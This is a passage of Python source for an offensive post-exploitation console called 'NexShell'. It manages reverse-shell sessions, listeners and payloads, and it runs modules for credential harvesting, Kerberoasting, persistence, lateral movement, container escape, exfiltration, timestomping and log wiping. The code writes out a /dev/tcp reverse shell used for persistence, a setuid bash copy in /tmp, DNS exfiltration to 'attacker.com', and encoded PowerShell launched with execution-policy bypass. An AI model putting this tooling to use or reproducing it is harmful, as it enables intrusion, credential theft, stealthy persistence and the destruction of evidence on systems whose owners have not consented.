                self.onecmd('EOF')
            except KeyboardInterrupt:
                print("^C"); self.interrupt()
            except Exception as e:
                logger.error(f"Menu error: {e}")

    @property
    def active_sessions(self):
        n = len(core.sessions)
        if n:
            s = 's' if n > 1 else ''
            return paint(f" ({n} active session{s})").red + paint().yellow
        return ""

    def set_id(self, ID):
        self.sid = ID
        session_part = ''
        opsec_profile = getattr(options, 'opsec_profile', 'normal')
        if self.sid:
            s = core.sessions.get(self.sid)
            if s:
                priv_color = 'red' if s.is_root else 'yellow'
                # Sanitize user string: strip terminal escape seqs and control chars (^G etc)
                import re as _re
                raw_user = s.user or '?'
                raw_user = _re.sub(r'\x1b\[[0-9;]*[mKHABCDJsu]', '', raw_user)  # ANSI escapes
                raw_user = _re.sub(r'[\x00-\x1f\x7f]', '', raw_user)             # control chars
                # Trim to just the username part if it looks like a shell prompt (e.g. user@host:~$)
                if raw_user.endswith('$') or raw_user.endswith('#'):
                    raw_user = raw_user.rstrip('$ #').strip()
                    if ':' in raw_user:
                        raw_user = raw_user.split(':')[0]  # keep user@host, drop :~
                user_str   = paint(raw_user).__getattr__(priv_color)
                tag_str    = f" [{s.tag}]" if s.tag else ''
                os_icon    = 'W' if getattr(s, 'OS', '') == 'Windows' else 'L'
                session_part = (
                    f"{paint('-(').teal_DIM}{paint('Session').lime} "
                    f"{paint('[' + str(self.sid) + ']').red}"
                    f"{paint(' ' + os_icon + ' ·').darkgrey} {user_str}"
                    f"{paint(tag_str).darkgrey}{paint(')').teal_DIM}"
                )
        # Status badge containing listener and session counts
        n_l = len(core.listeners)
        n_s = len(core.sessions)
        badge = ''
        if n_l or n_s:
            parts = []
            if n_l: parts.append(f"L:{n_l}")
            if n_s: parts.append(f"S:{n_s}")
            badge = f" [{':'.join(parts) if False else '|'.join(parts)}]"
        self.prompt = (
            f"{paint('(').teal_DIM}{paint('NexShell').purple_BRIGHT}{paint(')').teal_DIM}"
            f"{session_part}{badge}{paint('> ').teal_DIM}"
        )


    def _require_session(self, cmd_name=None):
        if not self.sid:
            if core.sessions:
                cmdlogger.warning('No session selected. Use "use [ID]"')
            else:
                cmdlogger.warning('No active sessions')
            return False
        return True

    # ── LHOST management ──────────────────────────────────────────────────────
    def do_lhost(self, line):
        """[auto|<ip>] — Show or change the operator LHOST IP"""
        line = (line or '').strip()
        if not line:
            # Show current value + all detected IPs
            print(f"\n  {paint('LHOST').teal}  =>  {paint(options.lhost).lime}")
            if len(options.lhost_all) > 1:
                for i, ip in enumerate(options.lhost_all):
                    mark = paint('*').lime if ip == options.lhost else paint(' ').darkgrey
                    print(f"    {mark} [{i}] {paint(ip).cyan}")
            print(f"\n  {paint('Usage:').darkgrey} lhost auto  |  lhost 10.10.14.x  |  lhost 0  (pick by index)")
        elif line == 'auto':
            options.lhost_all = _get_all_local_ips()
            options.lhost     = options.lhost_all[0] if options.lhost_all else _get_lhost()
            logger.info(f"LHOST auto-detected: {paint(options.lhost).lime}")
        elif line.isdigit():
            idx = int(line)
            if 0 <= idx < len(options.lhost_all):
                options.lhost = options.lhost_all[idx]
                logger.info(f"LHOST set to: {paint(options.lhost).lime}")
            else:
                cmdlogger.error(f"Index {idx} out of range (0-{len(options.lhost_all)-1})")
        else:
            options.lhost = line
            if line not in options.lhost_all:
                options.lhost_all.insert(0, line)
            logger.info(f"LHOST set to: {paint(options.lhost).lime}")

    # ── Tools share server ────────────────────────────────────────────────────
    def do_share(self, line):
        """[start|stop|status] — Control the tools/ HTTP share server"""
        line = (line or '').strip().lower()
        srv  = getattr(options, '_share_server', None)

        if line in ('', 'status'):
            port  = getattr(options, 'share_port', 9001)
            lhost = options.lhost
            running = srv is not None and getattr(srv, '_BaseServer__is_shut_down', None) is not None
            # Check if port is actually in use
            import socket as _s
            try:
                t = _s.socket(); t.connect(('127.0.0.1', port)); t.close(); running = True
            except Exception:
                running = False
            if running:
                print(f"\n  {paint('[SHARE]').lime} Server is {paint('UP').lime} on port {paint(port).cyan}")
                print(f"  {paint('URL').teal}   : http://{lhost}:{port}/")
                print(f"  {paint('wget').teal}  : wget http://{lhost}:{port}/<tool>")
                print(f"  {paint('curl').teal}  : curl http://{lhost}:{port}/<tool> -O <tool>")
                print(f"  {paint('ps').teal}    : iwr 'http://{lhost}:{port}/<tool>' -OutFile <tool>")
            else:
                print(f"\n  {paint('[SHARE]').darkgrey} Server is {paint('DOWN').red}")
                print(f"  Use: {paint('share start').lime}")

        elif line == 'start':
            _start_tools_share(background=True)
            port = options.share_port
            logger.info(f"[SHARE] Tools server started on port {port}")
            logger.info(f"  http://{options.lhost}:{port}/")

        elif line == 'stop':
            srv = getattr(options, '_share_server', None)
            if srv:
                try:
                    srv.shutdown()
                    options._share_server = None
                    logger.info("[SHARE] Server stopped")
                except Exception as e:
                    cmdlogger.error(f"[SHARE] Stop failed: {e}")
            else:
                cmdlogger.warning("[SHARE] No server running")
        else:
            cmdlogger.warning("Usage: share [start|stop|status]")

    # ── Operator info ─────────────────────────────────────────────────────────
    def do_whoami(self, line):
        """— Show operator system info (LHOST, OS, shell, terminal)"""
        _print_sysinfo_box()

    # ── Help ──────────────────────────────────────────────────────────────────
    def do_help(self, line):
        """[command] — Show help"""
        print()
        for section in self.commands:
            print(f"  {paint(section).purple_BRIGHT}")
            tbl = Table(joinchar=' · ')
            for cmd in self.commands[section]:
                key = cmd.split('|')[0]
                fn = getattr(self, f'do_{key}', None)
                doc = (fn.__doc__ or '').split('\n')[0].strip() if fn else ''
                tbl += [paint(cmd).lime, paint(doc).darkgrey]
            print(indent(str(tbl), '    '))
        print()

    # ── CD ────────────────────────────────────────────────────────────────────
    def do_cd(self, path):
        """[path] — Change NexShell working directory"""
        if not path: print(paint(os.getcwd()).yellow)
        else:
            try:
                os.chdir(Path(path).expanduser().resolve())
                logger.info(f"cwd → {paint(os.getcwd()).yellow}")
            except Exception as e:
                logger.error(e)

    # ── Sessions ──────────────────────────────────────────────────────────────
    def do_sessions(self, line):
        """[ID] — List or interact with sessions"""
        if line:
            self.do_interact(line); return
        if not core.sessions:
            cmdlogger.warning("No sessions yet 🪲")
            return
        for host, sessions in tuple(core.hosts.items()):
            if not sessions: continue
            print(f'\n  ➤  {sessions[0].name_colored}')
            tbl = Table(joinchar=' │ ')
            tbl.header = [paint(h).teal for h in ('ID','Shell','OS','User','Tag','Duration')]
            for s in tuple(sessions):
                ID = paint(f'[{s.id}]').red if self.sid==s.id else paint(f' {s.id}').yellow
                dur = str(datetime.now() - s.connected_at).split('.')[0]
                tbl += [
                    ID,
                    paint(s.type).lime if s.type=='PTY' else s.type,
                    paint(s.OS).cyan,
                    s.user or '?',
                    s.tag or '-',
                    dur,
                ]
            print(indent(str(tbl), '    '), '\n')

    def do_use(self, ID):
        """[SessionID|none] — Select a session"""
        if ID == 'none': self.set_id(None)
        elif ID and ID.isnumeric() and int(ID) in core.sessions:
            self.set_id(int(ID))
        else: cmdlogger.warning("Invalid session ID")

    def do_interact(self, ID):
        """[SessionID] — Interact with a session"""
        if not ID and self.sid: ID = str(self.sid)
        try:
            sid = int(ID)
            if sid in core.sessions:
                core.sessions[sid].attach(); return True
            cmdlogger.warning("Invalid session ID")
        except (ValueError, TypeError):
            cmdlogger.warning("Specify a session ID")

    def do_kill(self, ID):
        """[SessionID|*] — Kill session(s)"""
        if ID == '*':
            if not core.sessions: cmdlogger.warning("No sessions to kill"); return
            if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
                for s in reversed(tuple(core.sessions.values())): s.kill()
        elif ID and ID.isnumeric() and int(ID) in core.sessions:
            core.sessions[int(ID)].kill()
        elif self.sid and self.sid in core.sessions:
            core.sessions[self.sid].kill()
        else:
            cmdlogger.warning("Invalid session ID")

    # ── Tag & Notes ───────────────────────────────────────────────────────────
    def do_tag(self, line):
        """[SessionID] [label] — Tag a session with a custom name"""
        line = line or ''
        if not self._require_session(): return
        parts = line.split(' ', 1) if line else []
        if len(parts) == 2 and parts[0].isnumeric():
            sid = int(parts[0])
            if sid in core.sessions:
                core.sessions[sid].tag = parts[1]
                logger.info(f"Session [{sid}] tagged as: {paint(parts[1]).lime}")
        elif len(parts) == 1 and self.sid:
            core.sessions[self.sid].tag = parts[0]
            logger.info(f"Session [{self.sid}] tagged as: {paint(parts[0]).lime}")
        else:
            cmdlogger.warning("Usage: tag [SessionID] <label>")

    def do_snote(self, line):
        """[text] — Add a note to the current session (session-local)"""
        if not self._require_session(): return
        if line:
            core.sessions[self.sid].notes.append(f"[{datetime.now():%H:%M}] {line}")
            logger.info(f"Note added to Session [{self.sid}]")
        else:
            notes = core.sessions[self.sid].notes
            if notes:
                for n in notes: print(f"  {paint('•').teal} {n}")
            else:
                cmdlogger.warning("No notes yet")

    # ── Shell Operations ──────────────────────────────────────────────────────
    def do_upgrade(self, line):
        """— Upgrade shell to PTY"""
        if not self._require_session(): return
        core.sessions[self.sid].upgrade()

    def do_exec(self, cmdline):
        """<command> — Execute a remote command"""
        if not self._require_session(): return
        if cmdline:
            out = core.sessions[self.sid].exec(cmdline, timeout=5, value=True)
            if out: print(out)
        else: cmdlogger.warning("No command")

    def do_spawn(self, line):
        """[Port] [Host] — Spawn a new session"""
        if not self._require_session(): return
        core.sessions[self.sid].spawn()

    def do_maintain(self, line):
        """[N] — Maintain N active shells per host"""
        if line and line.isnumeric():
            options.maintain = int(line)
            logger.info(f"Maintain set to {paint(options.maintain).yellow}")
        else:
            st = paint('Enabled').lime if options.maintain>=2 else paint('Disabled').red
            logger.info(f"Maintain: {options.maintain}  {st}")

    def do_download(self, items):
        """<glob> — Download files from target"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].download(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_upload(self, items):
        """<glob|URL> — Upload files to target"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].upload(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_open(self, items):
        """<glob> — Download and open files locally"""
        if not self._require_session(): return
        if items: core.sessions[self.sid].download(items)
        else: cmdlogger.warning("Specify file(s)")

    def do_script(self, item):
        """<local|URL> — Run script in-memory on target"""
        if not self._require_session(): return
        if item: core.sessions[self.sid].script(item)
        else: cmdlogger.warning("Specify script")

    def do_portfwd(self, line):
        """<host:port -> host:port> — Port forwarding"""
        if not self._require_session(): return
        cmdlogger.warning("Port forwarding: full impl in v1.1")

    def do_run(self, line):
        """[module] [args] — Run an operational module"""
        line = line or ''
        if not line:
            self._show_modules()
            return
        if not self._require_session(): return
        parts = line.split(' ', 1)
        mod   = parts[0].lower()
        args  = parts[1] if len(parts) > 1 else ''
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False

        MODULE_MAP = {
            # ── Linux Recon
            'quickenum':        ('_quickenum',        False),
            'privesc':          ('_privesc',           False),
            'credharvest':      ('_credharvest',       False),
            'creds':            ('_credharvest',       False),
            # ── Windows Recon
            'win-enum':         ('_win_enum',          True),
            'win-privesc':      ('_win_privesc',       True),
            'win-creds':        ('_win_creds',         True),
            # ── Active Directory
            'ad-recon':         ('_ad_recon',          True),
            'ad-kerberoast':    ('_ad_kerberoast',     True),
            'ad-asreproast':    ('_ad_asreproast',     True),
            # ── Persistence
            'persist':          ('_persist',           None),
            'persist-linux':    ('_persist',           False),
            'persist-win':      ('_persist',           True),
            # ── Lateral Movement
            'lateral':          ('_lateral',           None),
            # ── Container Escape
            'container':        ('_container',         False),
            'container-auto':   ('_container_auto',    False),
            'container-docker': ('_container_docker',  False),
            'container-cgroup': ('_container_cgroup',  False),
            'container-k8s':    ('_container_k8s',     False),
            'container-ns':     ('_container_ns',      False),
            # ── Exfiltration
            'exfil':            ('_exfil',             None),
            # ── Loot
            'loot':             ('_loot',              None),
            'loot-scan':        ('_loot_scan',         None),
            'loot-report':      ('_loot_report',       None),
            # ── OPSEC
            'opsec':            ('_opsec',             None),
            'timestomp':        ('_timestomp',         None),
            'logclean':         ('_logclean',          None),
            'obfuscate':        ('_obfuscate',         None),
        }

        if mod in MODULE_MAP:
            method_name, requires_win = MODULE_MAP[mod]
            if requires_win is True and not win:
                cmdlogger.warning(f"Module '{mod}' is for Windows targets. Current OS: {getattr(session,'OS','?')}")
                return
            if requires_win is False and win:
                cmdlogger.warning(f"Module '{mod}' is for Linux/Unix targets. Current OS: Windows")
                return
            getattr(self, method_name)(args)
        else:
            cmdlogger.warning(f"Unknown module '{mod}'. Type 'run' to list all modules.")

    def _show_modules(self):
        try:
            from modules.ops import MODULE_REGISTRY
        except ImportError:
            MODULE_REGISTRY = {}

        categories = {
            'recon':   ('Recon',           paint('recon').teal),
            'privesc': ('Privilege Esc',    paint('privesc').red),
            'creds':   ('Credentials',      paint('creds').yellow),
            'ad':      ('Active Directory', paint('ad').orange),
            'persist': ('Persistence',      paint('persist').magenta),
            'lateral': ('Lateral Movement', paint('lateral').purple),
            'escape':  ('Container Escape', paint('escape').lime),
            'exfil':   ('Exfiltration',     paint('exfil').cyan),
            'loot':    ('Loot Collection',  paint('loot').teal),
            'opsec':   ('OPSEC',            paint('opsec').darkgrey),
        }

        try:
            from modules.ops import MODULE_REGISTRY as mods
        except ImportError:
            mods = {}

        print(f'\n  {paint("NexShell Module Arsenal").purple_BRIGHT}\n')
        grouped = {}
        for name, info in mods.items():
            t = info.get('type','misc')
            grouped.setdefault(t, []).append((name, info))

        for cat_key, (cat_label, cat_color) in categories.items():
            if cat_key not in grouped: continue
            print(f'  {cat_color} {paint(cat_label).BRIGHT}')
            tbl = Table(joinchar=' | ')
            for name, info in grouped[cat_key]:
                os_tag = paint(f"[{info.get('os','?')}]").darkgrey
                tbl += [paint(name).lime, paint(info.get('desc','')).white, os_tag]
            print(indent(str(tbl), '    '))
            print()


    # ── NexShell Elite Modules (Linux) ────────────────────────────────────────
    def do_quickenum(self, line):
        """— Run QuickEnum on Linux target (in-memory)"""
        if not self._require_session(): return
        self._quickenum(line)

    def _quickenum(self, args=''):
        logger.info("Running QuickEnum (in-memory, no disk touch)...")
        core.sessions[self.sid].exec_inmem(QUICKENUM_SCRIPT)

    def do_credharvest(self, line):
        """— Run CredentialHarvester on Linux target"""
        if not self._require_session(): return
        self._credharvest(line)

    def _credharvest(self, args=''):
        logger.info("Running CredentialHarvester (in-memory)...")
        core.sessions[self.sid].exec_inmem(CRED_HARVESTER_SCRIPT)

    def do_privesc(self, line):
        """— Run PrivEsc Advisor on Linux target"""
        if not self._require_session(): return
        self._privesc(line)

    def _privesc(self, args=''):
        logger.info("Running PrivEsc Advisor (in-memory)...")
        core.sessions[self.sid].exec_inmem(PRIVESC_SCRIPT)

    # ── NexShell Elite Modules (Windows) ──────────────────────────────────────
    def _win_enum(self, args=''):
        try:
            from modules.windows import WINDOWS_QUICKENUM
            script = WINDOWS_QUICKENUM
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows QuickEnum (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _win_privesc(self, args=''):
        try:
            from modules.windows import WINDOWS_PRIVESC_SCRIPT
            script = WINDOWS_PRIVESC_SCRIPT
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows PrivEsc Advisor (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _win_creds(self, args=''):
        try:
            from modules.windows import WINDOWS_CRED_HARVEST
            script = WINDOWS_CRED_HARVEST
        except ImportError:
            cmdlogger.error("Windows module not found"); return
        logger.info("Running Windows CredentialHarvester (PowerShell, in-memory)...")
        self._exec_powershell_inmem(script)

    def _exec_powershell_inmem(self, script: str):
        """Execute PowerShell script in-memory on Windows target."""
        import base64 as b64
        encoded = b64.b64encode(script.encode('utf-16-le')).decode()
        cmd = f'powershell -nop -NonI -ep bypass -enc {encoded}'
        session = core.sessions[self.sid]
        session.exec(cmd)

    # ── Active Directory Modules ───────────────────────────────────────────────
    def _ad_recon(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions[self.sid]
        logger.info("Running AD Recon (no external tools)...")
        scripts = [
            ADRecon.domain_info(),
            ADRecon.list_dcs(),
            ADRecon.list_admins(),
        ]
        combined = '\n'.join(scripts)
        self._exec_powershell_inmem(combined)

    def _ad_kerberoast(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        logger.info("Finding Kerberoastable SPNs...")
        self._exec_powershell_inmem(ADRecon.spn_scan())

    def _ad_asreproast(self, args=''):
        try:
            from modules.ops import ADRecon
        except ImportError:
            cmdlogger.error("ops module not found"); return
        logger.info("Finding ASREPRoastable accounts...")
        self._exec_powershell_inmem(ADRecon.asreproast())

    # ── Persistence Modules ───────────────────────────────────────────────────
    def _persist(self, args=''):
        try:
            from modules.ops import PersistenceModule
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        listeners = list(core.listeners.values())
        if not listeners:
            cmdlogger.warning("Start a listener first"); return
        l = listeners[0]
        host = Interfaces().ips[0] if Interfaces().ips else '127.0.0.1'
        port = l.port

        print(f'\n  {paint("Persistence Payloads").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')

        if win:
            from modules.windows import WindowsPayloads
            payload = WindowsPayloads.powershell_encoded(host, port)
            entries = PersistenceModule.all_windows(payload)
        else:
            cmd = f'bash -i >& /dev/tcp/{host}/{port} 0>&1'
            entries = PersistenceModule.all_linux(cmd)

        tbl = Table(joinchar=' │ ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(cmd_str[:100] + ('...' if len(cmd_str)>100 else '')).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Lateral Movement Module ────────────────────────────────────────────────
    def _lateral(self, args=''):
        try:
            from modules.ops import LateralMovement
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False
        print(f'\n  {paint("Lateral Movement").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')
        if win:
            entries = [
                ('SMB scan',    LateralMovement.smb_scan('192.168.1')),
                ('WMI exec',    'LateralMovement.wmiexec_windows(target, user, pass, cmd)'),
                ('DCOM exec',   'LateralMovement.dcom_exec(target, cmd)'),
                ('Pass-Hash',   'LateralMovement.pass_the_hash(target, user, hash)'),
            ]
        else:
            entries = [
                ('SSH hop',          'LateralMovement.ssh_hop(user, target)'),
                ('SSH agent hijack', 'LateralMovement.ssh_agent_hijack(sock_path)'),
                ('Docker escape',    LateralMovement.docker_escape_socket()),
                ('LXD escape',       LateralMovement.lxd_escape()),
                ('NFS exploit',      'LateralMovement.nfs_mount_exploit(server, share)'),
            ]
        tbl = Table(joinchar=' │ ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(str(cmd_str)[:100]).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Container Escape Modules ───────────────────────────────────────────────
    def _container(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        if session:
            logger.info("Container escape detector running (in-memory, no disk)...")
            session.exec_inmem(ContainerEscape.full_detect())
        else:
            print(paint(ContainerEscape.full_detect()).darkgrey)

    def _container_auto(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        listeners = list(core.listeners.values())
        lhost = Interfaces().ips[0] if Interfaces().ips else ''
        lport = listeners[0].port if listeners else 0
        logger.info("Auto-escape: trying all vectors...")
        session.exec_inmem(ContainerEscape.auto_escape(lhost, lport))

    def _container_docker(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        listeners = list(core.listeners.values())
        lhost = Interfaces().ips[0] if Interfaces().ips else ''
        lport = listeners[0].port if listeners else 0
        script = ContainerEscape.escape_docker_socket(lhost, lport)
        logger.info("Docker socket escape payload:")
        print(f'\n  {paint(script).yellow}\n')
        if core.sessions.get(self.sid):
            if ask("Send to session? (y/N): ").lower() == 'y':
                core.sessions[self.sid].exec_inmem(script)

    def _container_cgroup(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        cmd = args or 'cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh'
        logger.info(f"cgroups v1 release_agent escape. Payload cmd: {cmd}")
        session.exec_inmem(ContainerEscape.escape_cgroups_v1(cmd))

    def _container_k8s(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        logger.info("Kubernetes service account escape...")
        session.exec_inmem(ContainerEscape.escape_kubernetes())

    def _container_ns(self, args=''):
        try:
            from modules.ops import ContainerEscape
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        logger.info("Namespace escape via nsenter...")
        session.exec_inmem(ContainerEscape.escape_runc_namespace())

    # ── Loot Modules ──────────────────────────────────────────────────────────
    def _loot(self, args=''):
        try:
            from modules.loot import LootCollector, LINUX_COLLECTION_CMDS, WINDOWS_COLLECTION_CMDS
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        logger.info("Starting loot collection...")
        cmds = WINDOWS_COLLECTION_CMDS if win else LINUX_COLLECTION_CMDS
        for cmd in cmds[:5]:   # first 5 non-intrusive
            session.exec(cmd)

    def _loot_scan(self, args=''):
        try:
            from modules.loot import LootScanner
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        logger.info("Scanning session output for sensitive data...")
        # Grab last N bytes of session log
        logfile = session.directory / 'session.log'
        if logfile.exists():
            text = logfile.read_text(errors='replace')
            scanner = LootScanner()
            findings = scanner.scan(text)
            if findings:
                print(f'\n  {paint("Loot Findings").purple_BRIGHT}\n')
                for cat, items in findings.items():
                    if items:
                        print(f'  {paint(cat).orange}')
                        for item in items[:10]:
                            print(f'    {paint(">").teal} {item}')
            else:
                cmdlogger.warning("No sensitive data found in session log")
        else:
            cmdlogger.warning("No session log yet — run some commands first")

    def _loot_report(self, args=''):
        try:
            from modules.loot import LootCollector
        except ImportError:
            cmdlogger.error("loot module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        fmt = args.strip() or 'md'
        collector = LootCollector(str(session.directory))
        logfile = session.directory / 'session.log'
        if logfile.exists():
            collector.scan_text(logfile.read_text(errors='replace'))
        out = collector.export(fmt)
        rpt = session.directory / f'loot_report.{fmt}'
        rpt.write_text(out, encoding='utf-8')
        logger.info(f"Loot report saved: {paint(str(rpt)).lime}")

    # ── OPSEC Modules ─────────────────────────────────────────────────────────
    def _opsec(self, args=''):
        try:
            from modules.opsec import OpsecProfile
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        if args:
            profile = args.strip().lower()
            valid = ('ghost', 'normal', 'paranoid')
            if profile not in valid:
                cmdlogger.warning(f"Valid profiles: {', '.join(valid)}"); return
            options.opsec_profile = profile
            OpsecProfile.set(profile)
            logger.info(f"OPSEC profile set: {paint(profile.upper()).lime}")
        else:
            current = getattr(options, 'opsec_profile', 'normal')
            print(f'\n  {paint("OPSEC Profiles").purple_BRIGHT}\n')
            for name, desc in [
                ('ghost',    'Max stealth — jitter 200-500ms, no disk writes, AMSI bypass auto'),
                ('normal',   'Balanced — 50ms jitter, minimal logging'),
                ('paranoid', 'Ultra-paranoid — TLS only, C2 heartbeat, DoH comms, cleanup on exit'),
            ]:
                marker = paint('>>').lime if name == current else '  '
                print(f'  {marker} {str(paint(name).cyan):<20} {paint(desc).darkgrey}')
            print()

    def _timestomp(self, args=''):
        try:
            from modules.opsec import timestomp_linux, timestomp_windows
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        target = args.strip() or ('/tmp/.nxsh' if not win else '%TEMP%\\payload.exe')
        ref    = args.split()[1] if len(args.split()) > 1 else ''
        script = timestomp_windows(target, ref) if win else timestomp_linux(target, ref)
        logger.info(f"Timestomping: {paint(target).yellow}")
        if win:
            self._exec_powershell_inmem(script)
        else:
            session.exec_inmem(script)

    def _logclean(self, args=''):
        try:
            from modules.opsec import clean_linux_logs, clean_windows_logs
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        session = core.sessions.get(self.sid)
        if not session: return
        win = is_windows_session(session)
        logger.info("Cleaning logs on target...")
        if win:
            self._exec_powershell_inmem(clean_windows_logs())
        else:
            session.exec_inmem(clean_linux_logs())

    def _obfuscate(self, args=''):
        try:
            from modules.opsec import ObfuscationEngine
        except ImportError:
            cmdlogger.error("opsec module not found"); return
        if not args:
            cmdlogger.warning("Usage: run obfuscate <command>"); return
        parts = args.split(' ', 1)
        method = parts[0] if len(parts) > 1 and parts[0] in ('xor','b64','hex','chararray','iex') else 'b64'
        cmd    = parts[1] if len(parts) > 1 else parts[0]
        result = ObfuscationEngine.obfuscate(cmd, method)
        print(f'\n  {paint("Obfuscated").purple_BRIGHT} [{paint(method).cyan}]\n')
        print(f'  {paint(result).yellow}\n')

    # ── Data Exfil Module ─────────────────────────────────────────────────────
    def _exfil(self, args=''):
        try:
            from modules.ops import DataExfil
        except ImportError:
            cmdlogger.error("ops module not found"); return
        session = core.sessions.get(self.sid)
        win = is_windows_session(session) if session else False
        listeners = list(core.listeners.values())
        host = Interfaces().ips[0] if Interfaces().ips else '127.0.0.1'
        port = listeners[0].port if listeners else 4444
        print(f'\n  {paint("Exfiltration Techniques").purple_BRIGHT}  '
              f'[{paint("Windows" if win else "Linux").cyan}]\n')
        if win:
            entries = [
                ('HTTP POST',   DataExfil.windows_https_exfil('<file>', host, 8000)),
                ('SMB',        DataExfil.smb_exfil('<file>', host, 'share')),
                ('Certutil',   DataExfil.certutil_encode('<file>')),
            ]
        else:
            entries = [
                ('HTTP GET',   DataExfil.http_get_params('<data>', f'http://{host}:{port}')),
                ('DNS',        DataExfil.dns_exfil('<data>', 'attacker.com')),
                ('HTTP POST',  DataExfil.linux_http_exfil('<file>', host, 8000)),
            ]
        tbl = Table(joinchar=' | ')
        for name, cmd_str in entries:
            tbl += [paint(name).lime, paint(cmd_str[:100]).white]
        print(indent(str(tbl), '  '))
        print()

    # ── Listeners ──────────────────────────────────────────────────────────────
    def do_listeners(self, line):
        """[add -p <port>|stop <id>] — Manage listeners"""
        line = line or ''
        if line:
            parts = line.split()
            if parts[0] == 'add':
                port = int(parts[parts.index('-p')+1]) if '-p' in parts else options.default_listener_port
                TCPListener(options.interface, port)
            elif parts[0] == 'stop':
                lid = parts[1] if len(parts) > 1 else None
                if lid == '*':
                    for l in tuple(core.listeners.values()): l.stop()
                elif lid and lid.isnumeric() and int(lid) in core.listeners:
                    core.listeners[int(lid)].stop()
                else: cmdlogger.warning("Invalid listener ID")
        else:
            if core.listeners:
                tbl = Table(joinchar=' │ ')
                tbl.header = [paint(h).teal for h in ('ID','Type','Host','Port')]
                for l in core.listeners.values():
                    tbl += [str(l.id), 'TCP', str(l.host), str(l.port)]
                print('\n', indent(str(tbl), '  '), '\n', sep='')
            else:
                cmdlogger.warning("No active listeners")

    def do_payloads(self, line):
        """[interface|LHOST] [--obfuscate] [--linux|--windows|--all] — Generate payloads"""
        line = line or ''
        obf  = '--obfuscate' in line
        if '--windows' in line: target_os = 'windows'
        elif '--linux' in line: target_os = 'linux'
        else:                   target_os = 'all'
        iface = (line
                 .replace('--obfuscate', '').replace('--windows', '')
                 .replace('--linux', '').replace('--all', '').strip())

        if core.listeners:
            for l in core.listeners.values():
                if iface:
                    host = Interfaces().translate(iface)
                else:
                    # v2.2: use auto-detected LHOST
                    host = options.lhost if options.lhost != '0.0.0.0' else None
                    if not host or host == '0.0.0.0':
                        ips = Interfaces().ips
                        host = ips[0] if ips else '0.0.0.0'
                PayloadGenerator.display(host, l.port, obfuscate=obf, target_os=target_os)
        else:
            # No listener — show payloads with LHOST and default port, then auto-start listener
            host = options.lhost if options.lhost != '0.0.0.0' else '0.0.0.0'
            port = options.ports[0] if options.ports else 4444
            PayloadGenerator.display(host, port, obfuscate=obf, target_os=target_os)
            # ── Auto-start listener on the same port used in the payload ──────
            logger.info(
                f"Auto-starting listener on {paint(host if host != '0.0.0.0' else '0.0.0.0').cyan}"
                f":{paint(port).orange} (port used in payload)"
            )
            TCPListener(options.interface, port)

    def do_connect(self, line):
        """<Host> <Port> — Connect to a bind shell"""
        line = line or ''
        if not line: cmdlogger.warning("Specify host and port"); return
        try:
            host, port = line.split()
            if Connect(host, port) and not options.no_attach: return True
        except ValueError:
            cmdlogger.error("Usage: connect <host> <port>")

    def do_Interfaces(self, line):
        """— Show local network interfaces"""
        print(Interfaces())

    def do_dir(self, line):
        """[SessionID] — Show session local folder"""
        s = core.sessions.get(self.sid)
        folder = s.directory if s else options.basedir
        print(paint(folder).yellow)

    def do_SET(self, line):
        """[option] [value] — Show/set options. SET LHOST auto | SET LHOST <ip>"""
        line = line or ''
        if not line:
            # Show key options prominently
            print(f"\n  {paint('LHOST').teal}  =>  {paint(options.lhost).lime}")
            if len(options.lhost_all) > 1:
                print(f"  {paint('all IPs').darkgrey} =>  {paint(', '.join(options.lhost_all)).yellow}")
            print(f"  {paint('Shell').teal}  =>  {paint(options.shell_type).yellow}")
            print(f"  {paint('Term').teal}   =>  {paint(options.terminal_type).yellow}")
            print()
            rows = [[paint(k).teal, paint(repr(v)).yellow] for k, v in options.__dict__.items()
                    if not k.startswith('_') and k not in ('lhost_all',)]
            tbl = Table(rows, fillchar=[paint('.').darkgrey, 0], joinchar=' => ')
